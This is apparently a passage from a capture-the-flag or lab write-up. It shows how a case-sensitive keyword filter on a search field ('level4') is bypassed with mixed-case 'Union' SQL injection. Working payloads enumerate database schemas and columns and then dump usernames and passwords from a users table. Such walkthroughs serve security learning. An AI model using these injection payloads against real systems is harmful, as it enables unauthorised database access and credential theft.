It seems to now have a check that rather than replacements
simply runs logic to check whether the UPPER or lower case of UNION / join are present
in the strings and denies further processing.

Well fortunately SQL is case in-sensitive so It's even weaker in the sense that
Union / jOiN should work too, well let's do a sanity check..

a' Union Select * FROM search_engine WHERE ''='a
(Remember this only succeeds if the injection does)

Works as intended :) the exploit even looks even more elegant

So let's again obtain the allowed DBs which we can access
a' Union Select schema_name AS title, schema_name AS link, schema_name AS description FROM INFORMATION_SCHEMA.SCHEMATA Union Select * FROM search_engine WHERE ''='a

Well, there are again, level4 and INFORMATION_SCHEMA, let's again obtain the column information and their related tables
a' Union Select COLUMN_NAME AS title, TABLE_NAME AS link, DATA_TYPE AS description FROM INFORMATION_SCHEMA.COLUMNS Union Select * FROM search_engine WHERE ''='a

Again, nothing new, same search_engine table columns and users..

a' Union Select username AS title, username AS link, password AS description FROM users Union Select * FROM search_engine WHERE ''='a
